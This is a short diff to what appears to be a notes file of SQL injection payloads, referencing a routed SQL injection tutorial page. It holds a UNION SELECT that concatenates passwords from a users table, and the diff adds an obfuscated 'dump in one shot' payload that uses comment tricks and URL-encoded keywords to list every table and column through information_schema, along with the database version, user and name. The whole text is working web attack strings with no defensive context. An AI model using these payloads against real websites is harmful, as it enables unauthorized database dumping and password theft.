@@ -11,3 +11,8 @@ http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html
 
 
 min' union select 1, GROUP_CONCAT(password, ' ') FROM users--
+
+
+dios Do in one shot
+
+pid=-42 union select 1,2,3,group_concat('Injected by maxo:::',version(),'<br>','user::',system_user(),'<br>','Database::',database(),'<br>',make_set(6,@:=0x0a,(/*!50000select*/(1) %66rom (/*!50000information_schema.columns*/)where table_schema!='information_schema'and@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@)),5,6,7,8,9,10,11
